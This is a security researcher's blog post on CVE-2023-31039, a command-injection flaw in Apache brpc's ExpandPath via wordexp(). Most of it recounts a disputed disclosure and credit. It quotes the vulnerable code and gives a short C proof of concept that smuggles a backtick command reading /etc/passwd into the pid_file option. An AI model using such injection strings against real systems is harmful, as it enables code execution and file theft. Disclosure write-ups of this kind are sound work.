---
title: "CVE-2023-31039: Dont Steal My First CVE"
date: 2023-06-26T17:54:07+07:00
draft: false
iscjklanguage: false
isarchived: false
categories: ["Security Research"]
images: ["https://brpc.apache.org/images/docs/logo.png"]
aliases: []
description: "My first CVE experience and how it was stolen by someone else."
summary: "My first CVE experience and how it was stolen by someone else."
---


{{< figure src="https://brpc.apache.org/images/docs/logo.png"  >}}

## Introduction

In the vast landscape of open source software, collaboration and contribution are highly valued. Open source projects rely on the collective efforts of developers around the world to improve and secure their codebases. However, sometimes the lines between collaboration and opportunism can blur, leading to unexpected situations that can leave contributors feeling betrayed. Throughout this blog post, i highlights the importance of ethical behavior within open source communities for responsible disclosure and attribution, emphasizing the need for transparency, acknowledgment, and fair recognition of researcher effort. 

## Vulnerability
Before dive deep into the problem, lets talk about the vulnerability itself. The vulnerability occur at this [method](https://github.com/apache/brpc/blob/eda61e7762bcea98b85410f80a2fa55e2c618845/src/brpc/server.cpp#L1725)
```c
static std::string ExpandPath(const std::string &path) {
    if (path.empty()) {
        return std::string();
    }
    std::string ret;
    wordexp_t p;
    wordexp(path.c_str(), &p, 0);
    CHECK_EQ(p.we_wordc, 1u);
    if (p.we_wordc == 1) {
        ret = p.we_wordv[0];
    }
    wordfree(&p);
    return ret;
}
``` 
As you can see, the project is using `wordexp()` to expand a path. For example if you input path like `~/project/hack` it will translated into `/home/syahrul/project/hack`. According to `wordexp` [manual pages](https://man7.org/linux/man-pages/man3/wordexp.3.html) user supplied input must not contains some character to do command substitution like `${}` or double backtick because the path expansion from `wordexp` is same as the expansion by the shell `sh()`. So if you input path like `~/project/${hack}` it will translated into `/home/syahrul/project/hack` and the `hack` will be executed as a command. This is a critical vulnerability because it can lead to remote code execution. 

Back into the vulnerable code, if we can control the `path` string, we can run any command on system. After tracing the cross reference, the `ExpandPath` method is used by `PutPidFileIfNeeded()`

```c
void Server::PutPidFileIfNeeded() {
    _options.pid_file = ExpandPath(_options.pid_file);
    if (_options.pid_file.empty()) {
        return;
    }
    RPC_VLOG << "pid_file = " << _options.pid_file;
    ....
}
```

And the `_options.pid_file` is user controllable input from `ServerOptions::pid_file`. The example of usage of `ServerOptions::pid_file` is available on the [one of this unit test](https://github.com/apache/brpc/blob/8256f7f0d28169f295a2c34b513993276a93461b/test/brpc_server_unittest.cpp#L1386).

```c
TEST_F(ServerTest, create_pid_file) {
    {
        brpc::Server server;
        server._options.pid_file = "./pid_dir/sub_dir/./.server.pid";
        server.PutPidFileIfNeeded();
        pid_t pid = getpid();
        std::ifstream fin("./pid_dir/sub_dir/.server.pid");
        ASSERT_TRUE(fin.is_open());
        pid_t pid_from_file;
        fin >> pid_from_file;
        ASSERT_EQ(pid, pid_from_file);
    }
    std::ifstream fin("./pid_dir/sub_dir/.server.pid");
    ASSERT_FALSE(fin.is_open());
}
```
Now the vulnerability can exploited by mimic the unit test. The following payload will create a file named `pwned_by_ru1es` on `/tmp` directory.

```c
#include <brpc/server.h>

int main(int argc, char* argv[]) {
    brpc::Server server;
    brpc::ServerOptions options;
    options.pid_file = "`cat /etc/passwd > /tmp/pwned_by_ru1es`";
    if (server.Start(1337, &options) != 0)
    {
        LOG(ERROR) << "Fail to start HttpServer";
        return -1;
    }
    server.RunUntilAskedToQuit();
    return 0;
}
```

i have created the Proof of Concept with docker to reproduce the vulnerability. You can check it [here](https://github.com/sahruldotid/CVEs/tree/main/CVE-2023-31039)

## Reporting

Few days before i found the vulnerability, i stumble upon [this website](https://huntr.dev) that offer you some ability to report a open source security vulnerability to the maintainer. I think this is useful for me because i dont need to find any contact or email of the maintainer. Also this platform is cooperate with MITRE CVE Program to assign CVE ID so that i think this is a good place to report the vulnerability.

Here's the report link : [https://huntr.dev/bounties/c4c8b69e-daf7-4e6b-982b-732936a7d8a4/](https://huntr.dev/bounties/c4c8b69e-daf7-4e6b-982b-732936a7d8a4/)

I reported at 20 April 2023 with all the information like the description, vulnerable code, the PoC, and the impact of the vulnerability. 
![](https://res.cloudinary.com/dufqpnrqt/image/upload/v1762398752/248794384-73e2aa35-55e8-490d-a1c2-aa41bf3c9644_luuy6s.png)

After few days, specifically at 24 and 27 April 2023, the maintainer aknowledge and validate my report as valid security vulnerability
![](https://res.cloudinary.com/dufqpnrqt/image/upload/v1762398752/248795332-32aa1723-37a2-41a7-9eba-7460e654fce2_ariblv.png)

Few days without any response, i found that the maintainer released new version of brpc and the vulnerability has been patched within [this commit](https://github.com/apache/brpc/commit/49038448a718f3c5093cc9ebed6e316cf0041cc0)

![](https://res.cloudinary.com/dufqpnrqt/image/upload/v1762398751/248797371-956cdec1-f4fb-4e1e-8fad-9d237bb653e4_hdgf8y.png)

This is exactly same as the occurence of the vulnerability in my report and the date is obviously after my report. So i think this is a good sign that the maintainer has fixed the vulnerability.
![](https://res.cloudinary.com/dufqpnrqt/image/upload/v1762398751/248798665-5f8002bd-d278-4d67-bb2f-c9fd79c69206_e6y55r.png)

Then i contacted the admin of huntr.dev about status of my report now. One of the admin said that Apache is probably strategically delaying the publication of the vulnerability report. At first place i think maybe i need to wait more. But after few days, i found that the vulnerability has been published on [CVE-2023-31039](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-31039) and [NVD](https://nvd.nist.gov/vuln/detail/CVE-2023-31039) with the date 2021-05-08. 

This CVE date is exactly after i reported this vulnerability and the maintainer didnt event resolve my report at huntr.dev anymore. My patience is running out, through discord DM, i contacted one of the huntr.dev admin and they said: 
![](https://res.cloudinary.com/dufqpnrqt/image/upload/v1762398752/248801845-86b6bf09-8e63-480c-852d-be75dfc138f5_a2wcby.png)

Like i was expected, the maintainer didnt even resolve my report at huntr.dev after a week and now admin has to published the vulnerability manually. I think this is not fair for me because i have reported the vulnerability first and the maintainer didnt even resolve my report even they assign the CVE under someone name 🤣. This is a bad practice from the maintainer and i think this is not a good way to treat the security researcher. I also dissapointed because the platform didnt escalate the issue or do anything about it in order to help assign my name under the CVE 😅.

## Timeline
- 2023-04-20: Vulnerability discovered.
- 2023-04-24: Maintainer acknowledge the report.
- 2023-04-27: ASF Security Team validated this vulnerability.
- XXXX-XX-XX: Maintaner fixed the vulnerability.
- XXXX-XX-XX: Assigned CVE but not under my name.
- 2023-05-06: Saw vulnerability has been fixed and i contact the Admin why there's no updates.
- 2023-05-22: Admin replied and said that i need to wait.
- 2023-06-12: Recontact the Admin and ask for updates through DM.
- 2023-06-26: Vulnerability published.

## Conclusion

Well, at the end of the day, i cant do anything about it and just gave up. I hope this writeup can be a lesson for me and for the other security researcher to be more careful when reporting a vulnerability to the maintainer through third party platform.

### Q&A 
- Q: How did you know that the maintainer is stealing your vulnerability
- A: Well after doing some osint, i find out that someone who submit PR is one of maintainer. You can check his email at this [mailing list](https://seclists.org/oss-sec/2023/q2/130) 

Thank you for reading!